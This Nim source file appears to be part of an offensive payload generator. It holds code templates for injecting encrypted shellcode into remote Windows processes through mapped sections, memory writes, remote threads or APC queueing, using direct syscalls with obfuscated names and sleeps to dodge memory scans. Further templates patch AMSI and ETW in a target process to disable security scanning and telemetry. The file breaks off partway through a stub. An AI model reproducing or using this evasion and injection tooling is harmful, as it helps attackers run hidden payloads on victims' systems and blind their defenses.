let ShellcodeRemoteInjectMapSection * = """

        var pHandle2: HANDLE = -1 # Current Process Handle

        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
        
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            # NtCreateSection Call
            
            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
            var 
                hMapFile: HANDLE
                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

            status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
            when defined(verbose):
                echo obf("[*] NtCreateSection: "), toHex(status)

            var
                lpMapAddress: PVOID = NULL
                vSize: SIZE_T = sc_size
            # NtMapViewOfSection Call local
            status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

            when defined(verbose):
                echo obf("[*] NtMapViewOfSection: "), toHex(status)
            if (lpMapAddress == nil):
                echo obf("[-] Failed to map view of file")
                echo GetLastError()

            
            var bytesWritten: SIZE_T
            # NtWriteVirtualMemory Call
            status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            var lpMapAddressRemote: PVOID = NULL
            
            # NtMapViewOfSection Call remote
            when defined(RX):
                protectionValue = PAGE_EXECUTE_READ
            
            status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
            
            if (lpMapAddressRemote == nil):
                echo obf("[-] Failed to map view of file remote")
                echo toHex(status)
            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            ptrEncText = cast[ptr byte](lpMapAddress)
            ptrDecText = cast[ptr byte](lpMapAddress)
            decryptlate()
            
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)

            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(tProcess)

            when defined(verbose):
                echo success
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
            
            when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
        
            when defined(Hellsgate):
                if getSyscall(ntCreateSectionTable):
                    syscall = ntCreateSectionTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateSection")
            
            # NtCreateSection Call
            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
            var 
                hMapFile: HANDLE
                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

            status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
            when defined(verbose):
                echo obf("[*] NtCreateSection: "), toHex(status)
            
            if (hMapFile == 0):
                echo obf("[-] Failed to create file mapping")
                echo GetLastError()
            
            when defined(Hellsgate):
                if getSyscall(ntMapViewOfSectionTable):
                    syscall = ntMapViewOfSectionTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
            
            var
                lpMapAddress: PVOID = NULL
                vSize: SIZE_T = sc_size

            status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

            when defined(verbose):
                echo obf("[*] NtMapViewOfSection: "), toHex(status)

            if (lpMapAddress == nil):
                echo obf("[-] Failed to map view of file")
                echo GetLastError()
         
            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
            var bytesWritten: SIZE_T
            status = NtWriteVirtualMemory(
                pHandle2, 
                lpMapAddress, 
                unsafeAddr friendlycode, 
                sc_size, 
                addr bytesWritten)
            
            when defined(Hellsgate):
                if getSyscall(ntMapViewOfSectionTable):
                    syscall = ntMapViewOfSectionTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
            
            when defined(RX):
                protectionValue = PAGE_EXECUTE_READ
            var lpMapAddressRemote: PVOID = NULL
            status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
            
            if (lpMapAddressRemote == nil):
                echo obf("[-] Failed to map view of file remote")
                echo toHex(status)
            
            when defined(QueueAPC):
                # first create the sleep Thread before sleeping in between, because that could trigger memory scans
                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)

            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            ptrEncText = cast[ptr byte](lpMapAddress)
            ptrDecText = cast[ptr byte](lpMapAddress)
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
            
            when defined(QueueAPC):
                when defined(Hellsgate):
                    if getSyscall(ntQueueApcThreadTable):
                        syscall = ntQueueApcThreadTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
            
                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](lpMapAddressRemote)
                #var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)
                decryptlate()
                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, lpMapAddressRemote, nil, nil)
                when defined(verbose):
                    echo obf("[*] NtQueueApcThread: "), toHex(status)
                #when defined(sleepinbetween):
                #    HowMuchTimeWouldYouLikeToSleep(5)
                #Sleep(10)
                #decryptlate()
            else:
                decryptlate()
                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    lpMapAddressRemote, 
                    NULL, FALSE, 0, 0, 0, NULL)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)

    injectCreateRemoteThread(enctext) 

when not defined(proxy):
    when defined(defaultMain):
        when not defined(service):
            when not defined(cloned):
                discard main(nil)

"""


let ShellcoderemoteinjectStub * = """
    
        var pHandle2: HANDLE = -1 # Current Process Handle
        
        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
        
        
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T
            
            ptrEncText = cast[ptr byte](addr encText[0])
            ptrDecText = cast[ptr byte](addr decText[0])
            decryptlate()

            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                status = uashdiasdj(tProcess,&ds,&sc_size,PAGE_EXECUTE_READ,addr oldProtection)
                when defined(verbose):
                    echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                    if (status == 0):
                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                if(status != 0):
                    quit(1)

            when not defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            

            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(tProcess)
 
        else:

            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
        
            when not defined(spawninject):
                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), status
        
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
            

            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
            when defined(RX):
                protectionValue = PAGE_READWRITE
            when defined(RWX):
                protectionValue = PAGE_EXECUTE_READWRITE

            status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), status
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
            when defined(QueueAPC):
                # Do the Sleep Thread creation before decrypting, as that could lead to memory scans.
                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)

            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)

            ptrEncText = cast[ptr byte](addr encText[0])
            ptrDecText = cast[ptr byte](addr decText[0])
            decryptlate()

            status = NtWriteVirtualMemory(
                tProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), status
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(RX):
                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                
                status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
                when defined(verbose):
                    echo obf("[*] NtProtectVirtualMemory: "), status
                    if (status == 0):
                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                if(status != 0):
                    quit(1)
            
            when not defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            
            when defined(QueueAPC):
                when defined(Hellsgate):
                    if getSyscall(ntQueueApcThreadTable):
                        syscall = ntQueueApcThreadTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
            
                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](ds)
                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, ds, nil, nil)
                when defined(verbose):
                    echo obf("[*] NtQueueApcThread: "), toHex(status)
            else:
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                
                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    ds, 
                    NULL, FALSE, 0, 0, 0, NULL)
                
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)

                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")

                status = NtClose(tHandle)
                status = NtClose(tProcess)

    

    injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory

when not defined(proxy):
    when defined(defaultMain):
        when not defined(service):
            when not defined(cloned):
                discard main(nil)

"""

let ShellcoderemoteinjectStub_notepad * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = remoteProcID

"""

let ShellcoderemoteinjectStub_customprocfirst * = """

    proc FindPidByName (processName : string):DWORD =
        try:
            var 
                entry : PROCESSENTRY32A
                snapshot : HANDLE
                pid : DWORD = 0
            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != INVALID_HANDLE_VALUE:
                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
                if Process32FirstA(snapshot,addr entry):
                    while Process32NextA(snapshot,addr entry):
                        pid = entry.th32ProcessID
                        if ($(entry.szExeFile).join()).contains(processName):
                            result = pid
        except: 
            when defined(verbose):
                echo obf("Process ID not found")

    var processID: DWORD
"""

let ShellcoderemoteinjectStub_customprocID * = """
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        when defined(verbose):
            echo obf("Checking: ") & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    when defined(verbose):
        echo obf("[*] Target Process: "), processID
    var remoteProcID: DWORD = processID
"""

let ShellcoderemoteinjectStub_customprocthird * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

"""


let RemotePatchAMSIStub* = """

    proc RemotePatchAmsi(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x75] # Patch JZ to JNZ
        elif defined i386:
            let patch: array[1, byte] = [byte 0x75] 


        var disabled: bool = false
    
        var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
        if RemoteHandle == 0:
            when defined(verbose):
                echo obf("[X] Failed to get amsi.dll handle")
            return disabled

        var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
        if RemoteProc == NULL:
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
            return disabled
        when defined amd64:
            RemoteProc = RemoteProc + 0x6D
        else:
            RemoteProc = RemoteProc + 0x47
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
        
        else:
            when not defined(spawninject):
                when defined(Hellsgate):
                    if getSyscall(ntOpenTable):
                        syscall = ntOpenTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtOpenProcess")

                status = NtOpenProcess(
                    &hProcss,
                    PROCESS_ALL_ACCESS, 
                    &oa, &cid         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
        
        when not defined(spawninject):
            var procHandle2: HANDLE = hProcss
        else:
            var procHandle2: HANDLE = tProcess

        success = RemotePatchAmsi(procHandle2)
        if (success == 0):
            success = remoteLoadAmsi(remoteProcID)
            HowMuchTimeWouldYoulikeToSleep(2)
            success = RemotePatchAmsi(procHandle2)
        when defined(verbose):
            echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

    #amsRemote()

"""


let RemoteLoadAMSIStub* = """

    proc remoteLoadAmsi(processID: var DWORD): bool =

    
        # C:\windows\system32\amsi.dll
        var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
        char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
        char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
        
        when defined(verbose):
            echo obf("[*] Loading amsi.dll in the remote process: "), processID
        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            if(status == 0):
                return true
            else:
                return false
        else:
            
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                tProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                tProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
            when defined(verbose):
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                tProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                tProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = NtClose(tHandle)
            
            if(status == 0):
                return true
            else:
                return false


"""



let RemotePatchETWStub* = """


    proc RemotePatchETW(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        elif defined i386:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112


        var disabled: bool = false
    
        var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("ntdll.dll"))
        if RemoteHandle == 0:
            when defined(verbose):
                echo obf("[X] Failed to get ntdll.dll handle")
            return disabled

        var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("NtTraceEvent"))
        if RemoteProc == NULL:
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'NtTraceEvent'")
            return disabled
        
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        var cid: CLIENT_ID
        when not defined(spawninject):
            var hProcss: HANDLE
        var status: NTSTATUS
        cid.UniqueProcess = remoteProcID
        var oa: OBJECT_ATTRIBUTES
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(
                    &hProcss,
                    PROCESS_ALL_ACCESS, 
                    &oa, &cid         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
        
        when not defined(spawninject):
            var procHandle: HANDLE = hProcss
        else:
            var procHandle: HANDLE = tProcess

        success = RemotePatchETW(procHandle)
        if (success == 0):
            success = remoteLoadNtdll(remoteProcID)
            HowMuchTimeWouldYoulikeToSleep(2)
            success = RemotePatchETW(procHandle)
        when defined(verbose):
            echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"


"""


let RemoteLoadNTDLLStub* = """

    proc remoteLoadNtdll(processID: var DWORD): bool =

    
        # C:\windows\system32\ntdll.dll
        var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
        char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
        char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
        char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
        
        when defined(verbose):
            echo obf("[*] Loading ntdll.dll in the remote process: "), processID
        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

        when defined(SysWhispers):
            when not defined(spawninject):
